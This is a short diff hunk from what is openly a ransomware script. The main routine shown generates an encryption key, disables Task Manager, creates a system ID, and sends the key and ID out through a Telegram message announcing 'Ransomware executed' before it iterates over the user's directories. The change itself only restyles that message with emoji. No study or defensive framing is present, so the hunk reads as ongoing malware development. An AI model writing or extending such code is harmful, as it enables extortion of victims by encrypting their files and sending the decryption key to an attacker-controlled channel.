@@ -145,7 +145,7 @@ if __name__ == '__main__':
     encryption_key = generate_encryption_key()
     disable_task_manager()
     system_id = generate_system_id()
-    send_telegram_message(f"[!] Ransomware executed.\nSystem ID: {system_id}\nKey: {encryption_key.decode()}")
+    send_telegram_message(f"‼️ Ransomware executed.\n ℹ️ System ID: {system_id}\n ℹ️ Key: {encryption_key.decode()}")
     directories = get_user_directories()
     for directory in directories:
         if os.path.exists(directory):
